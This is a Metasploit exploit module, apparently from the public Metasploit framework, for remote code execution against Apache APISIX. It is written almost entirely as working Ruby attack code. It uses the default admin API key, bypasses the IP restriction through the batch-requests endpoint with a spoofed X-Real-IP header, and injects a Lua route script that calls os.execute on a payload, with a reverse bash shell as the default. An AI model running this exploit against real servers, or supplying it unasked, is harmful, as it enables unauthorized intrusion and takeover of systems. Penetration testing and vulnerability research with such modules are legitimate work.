##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  prepend Msf::Exploit::Remote::AutoCheck

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'APISIX Admin API default access token RCE',
        'Description' => %q{
          Apache APISIX has a default built-in API token edd1c9f034335f136f87ad84b625c8f1
          that can be used to access all the admin API, which leads to the
          remote LUA code execution through the script parameter added in the 2.x version.
          This module also leverages the another vulnerability to bypass the IP restriction
          plugin.
        },
        'Author' => [
          'Heyder Andrade <eu[at]heyderandrade.org>', # module development and debugging
          'YuanSheng Wang <membphis[at]gmail.com>' # discovered
        ],
        'License' => MSF_LICENSE,
        'References' => [
          ['CVE', '2020-13945'],
          ['CVE', '2022-24112'],
          ['URL', 'https://github.com/apache/apisix/pull/2244'],
          ['URL', 'https://seclists.org/oss-sec/2020/q4/187'],
          ['URL', 'https://www.openwall.com/lists/oss-security/2022/02/11/3']
        ],
        'DisclosureDate' => '2020-12-07',
        'Arch' => ARCH_CMD,
        'Platform' => %w[win unix],
        'Targets' => [
          [
            'Unix (In-Memory)',
            {
              'Platform' => 'unix',
              'Arch' => ARCH_CMD,
              'Type' => :unix_memory,
              'DefaultOptions' => { 'PAYLOAD' => 'cmd/unix/reverse_bash' }
            }
          ]
        ],
        'Privileged' => false,
        'DefaultTarget' => 0,
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [REPEATABLE_SESSION],
          'SideEffects' => [IOC_IN_LOGS]
        }
      )
    )
    register_options([
      OptString.new('TARGETURI', [true, 'Path to the batch-request controller', '/apisix/batch-requests']),
      OptString.new('API_KEY', [true, 'Admin API KEY (Default: edd1c9f034335f136f87ad84b625c8f1)', 'edd1c9f034335f136f87ad84b625c8f1']),
      OptString.new('ALLOWED_IP', [true, 'IP in the allowed list', '127.0.0.1'])
    ])
  end

  def check
    print_status("Checking component version to #{datastore['RHOST']}:#{datastore['RPORT']}")
    # perform an unautheticated request to a random path
    res = send_request_cgi({
      'uri' => normalize_uri(Rex::Text.rand_text_alpha_lower(6)), # random path
      'method' => 'GET'
    })

    if res && res.headers.key?('Server')
      res.headers['Server'].match(%r{APISIX/(.*)$})
      version = Rex::Version.new(Regexp.last_match(1))
      vprint_status "Found an APISIX #{version}"
      if version > Rex::Version.new('2')
        vprint_good 'This version has the script feature'
        # authenticated request to the admin routes
        res = send_request_cgi({
          'uri' => normalize_uri('/apisix/admin/routes'),
          'method' => 'GET',
          'headers' => { 'X-API-KEY' => datastore['API_KEY'] }
        })

        if res && res.code == 200
          vprint_good 'Direct access to the routes'
          return Exploit::CheckCode::Appears
        else
          vprint_status 'Trying to bypass restriction'
          # data = restriction_bypass('GET', '/apisix/admin/routes')
          # res = request data
          # TODO: check the response
        end
      else
        vprint_error 'This version has not the script feature'
        return Exploit::CheckCode::Safe
      end
    else
      vprint_error 'Seems not a APISIX server'
      return Exploit::CheckCode::Safe
    end

    return Exploit::CheckCode::Unknown
  end

  def exploit
    add_route Rex::Text.rand_text_alpha_lower(6)
    handler
  end

  def restriction_bypass(method, path, body = nil)
    headers = {
      'X-Real-IP': datastore['ALLOWED_IP'].to_s,
      'Content-Type': 'application/json'
    }
    pipeline = {
      method: method.to_s,
      path: path.to_s
    }
    pipeline.merge!({ 'body' => body }) if body

    {
      headers: headers,
      timeout: 500,
      pipeline: [pipeline]
    }.to_json.gsub(/\\u(....)/) { [Regexp.last_match(1).hex].pack('U') } # handle unicode
  end

  def request(method = 'POST', data = nil)
    params = {
      'uri' => normalize_uri(target_uri.path.to_s),
      'method' => method,
      'ctype' => 'application/json',
      'headers' => {
        'X-API-KEY' => datastore['API_KEY'],
        'Accept' => '*/*',
        'Accept-Encoding' => 'gzip, deflate'
      }
    }
    params.merge!({ 'data' => data }) if data
    send_request_cgi(params)
  end

  def add_route(path)
    body = "{\"uri\":\"#{path}\",\"script\":\"require('os');os.execute('PAYLOAD');\",\"upstream\":{\"type\":\"roundrobin\",\"nodes\":{\"example.com:80\":1}}}"
    body.gsub!('PAYLOAD', payload.raw.to_s.gsub('\'') { '\\\"' })

    data = restriction_bypass('POST', '/apisix/admin/routes', body)

    request 'POST', data
  end

end
